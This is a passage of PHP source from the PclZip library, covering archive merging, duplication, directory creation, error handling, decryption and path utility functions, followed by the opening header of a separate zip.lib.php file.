        @unlink($this->zipname);

        // ----- Rename the temporary file
        // TBC : I should test the result ...
        //@rename($v_zip_temp_name, $this->zipname);
        PclZipUtilRename($v_zip_temp_name, $this->zipname);
    
        // ----- Destroy the temporary archive
        unset($v_temp_zip);
    }
    
    // ----- Remove every files : reset the file
    else if ($v_central_dir['entries'] != 0) {
        $this->privCloseFd();

        if (($v_result = $this->privOpenFd('wb')) != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        $this->privCloseFd();
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDirCheck()
  // Description :
  //   Check if a directory exists, if not it creates it and all the parents directory
  //   which may be useful.
  // Parameters :
  //   $p_dir : Directory path to check.
  // Return Values :
  //    1 : OK
  //   -1 : Unable to create directory
  // --------------------------------------------------------------------------------
  function privDirCheck($p_dir, $p_is_dir=false)
  {
    $v_result = 1;

    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privDirCheck", "entry='$p_dir', is_dir='".($p_is_dir?"true":"false")."'");

    // ----- Remove the final '/'
    if (($p_is_dir) && (substr($p_dir, -1)=='/'))
    {
      $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Looking for entry '$p_dir'");

    // ----- Check the directory availability
    if ((is_dir($p_dir)) || ($p_dir == ""))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, "'$p_dir' is a directory");
      return 1;
    }

    // ----- Extract parent directory
    $p_parent_dir = dirname($p_dir);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Parent directory is '$p_parent_dir'");

    // ----- Just a check
    if ($p_parent_dir != $p_dir)
    {
      // ----- Look for parent directory
      if ($p_parent_dir != "")
      {
        if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
        {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
      }
    }

    // ----- Create the directory
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Create directory '$p_dir'");
    if (!@mkdir($p_dir, 0777))
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result, "Directory '$p_dir' created");
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privMerge()
  // Description :
  //   If $p_archive_to_add does not exist, the function exit with a success result.
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privMerge(&$p_archive_to_add)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privMerge", "archive='".$p_archive_to_add->zipname."'");
    $v_result=1;

    // ----- Look if the archive_to_add exists
    if (!is_file($p_archive_to_add->zipname))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive to add does not exist. End of merge.");

      // ----- Nothing to merge, so merge is a success
      $v_result = 1;

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Look if the archive exists
    if (!is_file($this->zipname))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive does not exist, duplicate the archive_to_add.");

      // ----- Do a duplicate
      $v_result = $this->privDuplicate($p_archive_to_add->zipname);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('rb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privCloseFd();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in zip : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in zip : ".ftell($this->zip_fd)."'");

    // ----- Open the archive_to_add file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open archive_to_add in binary read mode");
    if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
    {
      $this->privCloseFd();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir_to_add = array();
    if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
    {
      $this->privCloseFd();
      $p_archive_to_add->privCloseFd();

      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in archive_to_add : ".ftell($p_archive_to_add->zip_fd)."'");
    @rewind($p_archive_to_add->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in archive_to_add : ".ftell($p_archive_to_add->zip_fd)."'");

    // ----- Creates a temporay file
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

    // ----- Open the temporary file in write mode
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
    {
      $this->privCloseFd();
      $p_archive_to_add->privCloseFd();

      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Copy the files from the archive to the temporary file
    // TBC : Here I should better append the file and go back to erase the central dir
    $v_size = $v_central_dir['offset'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Copy the files from the archive_to_add into the temporary file
    $v_size = $v_central_dir_to_add['offset'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Store the offset of the central dir
    $v_offset = @ftell($v_zip_temp_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "New offset of central dir : $v_offset");

    // ----- Copy the block of file headers from the old archive
    $v_size = $v_central_dir['size'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = @fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Copy the block of file headers from the archive_to_add
    $v_size = $v_central_dir_to_add['size'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Merge the file comments
    $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

    // ----- Calculate the size of the (new) central header
    $v_size = @ftell($v_zip_temp_fd)-$v_offset;

    // ----- Swap the file descriptor
    // Here is a trick : I swap the temporary fd with the zip fd, in order to use
    // the following methods on the temporary fil and not the real archive fd
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Create the central dir footer
    if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
    {
      $this->privCloseFd();
      $p_archive_to_add->privCloseFd();
      @fclose($v_zip_temp_fd);
      $this->zip_fd = null;

      // ----- Reset the file list
      unset($v_header_list);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Swap back the file descriptor
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Close
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    // ----- Close the temporary file
    @fclose($v_zip_temp_fd);

    // ----- Delete the zip file
    // TBC : I should test the result ...
    @unlink($this->zipname);

    // ----- Rename the temporary file
    // TBC : I should test the result ...
    //@rename($v_zip_temp_name, $this->zipname);
    PclZipUtilRename($v_zip_temp_name, $this->zipname);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDuplicate()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDuplicate($p_archive_filename)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privDuplicate", "archive_filename='$p_archive_filename'");
    $v_result=1;

    // ----- Look if the $p_archive_filename exists
    if (!is_file($p_archive_filename))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive to duplicate does not exist. End of duplicate.");

      // ----- Nothing to duplicate, so duplicate is a success.
      $v_result = 1;

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('wb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Open the temporary file in write mode
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
    {
      $this->privCloseFd();

      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Copy the files from the archive to the temporary file
    // TBC : Here I should better append the file and go back to erase the central dir
    $v_size = filesize($p_archive_filename);
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Read $v_read_size bytes");
      $v_buffer = fread($v_zip_temp_fd, $v_read_size);
      @fwrite($this->zip_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Close
    $this->privCloseFd();

    // ----- Close the temporary file
    @fclose($v_zip_temp_fd);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privErrorLog()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privErrorLog($p_error_code=0, $p_error_string='')
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      PclError($p_error_code, $p_error_string);
    }
    else {
      $this->error_code = $p_error_code;
      $this->error_string = $p_error_string;
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privErrorReset()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privErrorReset()
  {
    if (PCLZIP_ERROR_EXTERNAL == 1) {
      PclErrorReset();
    }
    else {
      $this->error_code = 0;
      $this->error_string = '';
    }
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDecrypt()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDecrypt($p_encryption_header, &$p_buffer, $p_size, $p_crc)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privDecrypt', "size=".$p_size."");
    $v_result=1;
    
    // ----- To Be Modified ;-)
    $v_pwd = "test";
    
    $p_buffer = PclZipUtilZipDecrypt($p_buffer, $p_size, $p_encryption_header,
                                         $p_crc, $v_pwd);
    
    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privDisableMagicQuotes()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privDisableMagicQuotes()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privDisableMagicQuotes', "");
    $v_result=1;

    // ----- Look if function exists
    if (   (!function_exists("get_magic_quotes_runtime"))
            || (!function_exists("set_magic_quotes_runtime"))) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Functions *et_magic_quotes_runtime are not supported");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

    // ----- Look if already done
    if ($this->magic_quotes_status != -1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "magic_quote already disabled");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

        // ----- Get and memorize the magic_quote value
        $this->magic_quotes_status = @get_magic_quotes_runtime();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Current magic_quotes_runtime status is '".($this->magic_quotes_status==0?'disable':'enable')."'");

        // ----- Disable magic_quotes
        if ($this->magic_quotes_status == 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Disable magic_quotes");
          @set_magic_quotes_runtime(0);
        }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privSwapBackMagicQuotes()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privSwapBackMagicQuotes()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::privSwapBackMagicQuotes', "");
    $v_result=1;

    // ----- Look if function exists
    if (   (!function_exists("get_magic_quotes_runtime"))
            || (!function_exists("set_magic_quotes_runtime"))) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Functions *et_magic_quotes_runtime are not supported");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

    // ----- Look if something to do
    if ($this->magic_quotes_status != -1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "magic_quote not modified");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
        }

        // ----- Swap back magic_quotes
        if ($this->magic_quotes_status == 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Enable back magic_quotes");
          @set_magic_quotes_runtime($this->magic_quotes_status);
        }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  }
  // End of class
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilPathReduction()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function PclZipUtilPathReduction($p_dir)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilPathReduction", "dir='$p_dir'");
    $v_result = "";

    // ----- Look for not empty path
    if ($p_dir != "") {
      // ----- Explode path by directory names
      $v_list = explode("/", $p_dir);

      // ----- Study directories from last to first
      $v_skip = 0;
      for ($i=sizeof($v_list)-1; $i>=0; $i--) {
        // ----- Look for current path
        if ($v_list[$i] == ".") {
          // ----- Ignore this directory
          // Should be the first $i=0, but no check is done
        }
        else if ($v_list[$i] == "..") {
                  $v_skip++;
        }
        else if ($v_list[$i] == "") {
                  // ----- First '/' i.e. root slash
                  if ($i == 0) {
            $v_result = "/".$v_result;
                    if ($v_skip > 0) {
                        // ----- It is an invalid path, so the path is not modified
                        // TBC
                        $v_result = $p_dir;
                //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Invalid path is unchanged");
                $v_skip = 0;
                    }
                  }
                  // ----- Last '/' i.e. indicates a directory
                  else if ($i == (sizeof($v_list)-1)) {
            $v_result = $v_list[$i];
                  }
                  // ----- Double '/' inside the path
                  else {
            // ----- Ignore only the double '//' in path,
            // but not the first and last '/'
                  }
        }
        else {
                  // ----- Look for item to skip
                  if ($v_skip > 0) {
                    $v_skip--;
                  }
                  else {
            $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
                  }
        }
      }
      
      // ----- Look for skip
      if ($v_skip > 0) {
        while ($v_skip > 0) {
            $v_result = '../'.$v_result;
            $v_skip--;
        }
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilPathInclusion()
  // Description :
  //   This function indicates if the path $p_path is under the $p_dir tree. Or,
  //   said in an other way, if the file or sub-dir $p_path is inside the dir
  //   $p_dir.
  //   The function indicates also if the path is exactly the same as the dir.
  //   This function supports path with duplicated '/' like '//', but does not
  //   support '.' or '..' statements.
  // Parameters :
  // Return Values :
  //   0 if $p_path is not inside directory $p_dir
  //   1 if $p_path is inside directory $p_dir
  //   2 if $p_path is exactly the same as $p_dir
  // --------------------------------------------------------------------------------
  function PclZipUtilPathInclusion($p_dir, $p_path)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilPathInclusion", "dir='$p_dir', path='$p_path'");
    $v_result = 1;
    
    // ----- Look for path beginning by ./
    if (   ($p_dir == '.')
        || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
      $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Replacing ./ by full path in p_dir '".$p_dir."'");
    }
    if (   ($p_path == '.')
        || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
      $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Replacing ./ by full path in p_path '".$p_path."'");
    }

    // ----- Explode dir and path by directory separator
    $v_list_dir = explode("/", $p_dir);
    $v_list_dir_size = sizeof($v_list_dir);
    $v_list_path = explode("/", $p_path);
    $v_list_path_size = sizeof($v_list_path);

    // ----- Study directories paths
    $i = 0;
    $j = 0;
    while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Working on dir($i)='".$v_list_dir[$i]."' and path($j)='".$v_list_path[$j]."'");

      // ----- Look for empty dir (path reduction)
      if ($v_list_dir[$i] == '') {
        $i++;
        continue;
      }
      if ($v_list_path[$j] == '') {
        $j++;
        continue;
      }

      // ----- Compare the items
      if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Items ($i,$j) are different");
        $v_result = 0;
      }

      // ----- Next items
      $i++;
      $j++;
    }

    // ----- Look if everything seems to be the same
    if ($v_result) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Look for tie break");
      // ----- Skip all the empty items
      while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
      while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Looking on dir($i)='".($i < $v_list_dir_size?$v_list_dir[$i]:'')."' and path($j)='".($j < $v_list_path_size?$v_list_path[$j]:'')."'");

      if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
        // ----- There are exactly the same
        $v_result = 2;
      }
      else if ($i < $v_list_dir_size) {
        // ----- The path is shorter than the dir
        $v_result = 0;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilCopyBlock()
  // Description :
  // Parameters :
  //   $p_mode : read/write compression mode
  //             0 : src & dest normal
  //             1 : src gzip, dest normal
  //             2 : src normal, dest gzip
  //             3 : src & dest gzip
  // Return Values :
  // --------------------------------------------------------------------------------
  function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilCopyBlock", "size=$p_size, mode=$p_mode");
    $v_result = 1;

    if ($p_mode==0)
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Src offset before read :".(@ftell($p_src)));
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Dest offset before write :".(@ftell($p_dest)));
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @fread($p_src, $v_read_size);
        @fwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Src offset after read :".(@ftell($p_src)));
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Dest offset after write :".(@ftell($p_dest)));
    }
    else if ($p_mode==1)
    {
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @gzread($p_src, $v_read_size);
        @fwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }
    else if ($p_mode==2)
    {
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @fread($p_src, $v_read_size);
        @gzwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }
    else if ($p_mode==3)
    {
      while ($p_size != 0)
      {
        $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
        $v_buffer = @gzread($p_src, $v_read_size);
        @gzwrite($p_dest, $v_buffer, $v_read_size);
        $p_size -= $v_read_size;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilRename()
  // Description :
  //   This function tries to do a simple rename() function. If it fails, it
  //   tries to copy the $p_src file in a new $p_dest file and then unlink the
  //   first one.
  // Parameters :
  //   $p_src : Old filename
  //   $p_dest : New filename
  // Return Values :
  //   1 on success, 0 on failure.
  // --------------------------------------------------------------------------------
  function PclZipUtilRename($p_src, $p_dest)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilRename", "source=$p_src, destination=$p_dest");
    $v_result = 1;

    // ----- Try to rename the files
    if (!@rename($p_src, $p_dest)) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Fail to rename file, try copy+unlink");

      // ----- Try to copy & unlink the src
      if (!@copy($p_src, $p_dest)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Fail to copy file");
        $v_result = 0;
      }
      else if (!@unlink($p_src)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Fail to unlink old filename");
        $v_result = 0;
      }
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilOptionText()
  // Description :
  //   Translate option value in text. Mainly for debug purpose.
  // Parameters :
  //   $p_option : the option value.
  // Return Values :
  //   The option text value.
  // --------------------------------------------------------------------------------
  function PclZipUtilOptionText($p_option)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZipUtilOptionText", "option='".$p_option."'");
    
    $v_list = get_defined_constants();
    for (reset($v_list); $v_key = key($v_list); next($v_list)) {
          $v_prefix = substr($v_key, 0, 10);
          if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
              && ($v_list[$v_key] == $p_option)) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_key);
          return $v_key;
            }
    }
    
    $v_result = 'Unknown';

    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : PclZipUtilTranslateWinPath()
  // Description :
  //   Translate windows path by replacing '\' by '/' and optionally removing
  //   drive letter.
  // Parameters :
  //   $p_path : path to translate.
  //   $p_remove_disk_letter : true | false
  // Return Values :
  //   The path translated.
  // --------------------------------------------------------------------------------
  function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
  {
    if (stristr(php_uname(), 'windows')) {
      // ----- Look for potential disk letter
      if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
          $p_path = substr($p_path, $v_position+1);
      }
      // ----- Change potential windows directory separator
      if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
          $p_path = strtr($p_path, '\\', '/');
      }
    }
    return $p_path;
  }
  // --------------------------------------------------------------------------------
?>

<?php 
/* $Id: zip.lib.php,v 2.4 2004/11/03 13:56:52 garvinhicking Exp $ */
// vim: expandtab sw=4 ts=4 sts=4:


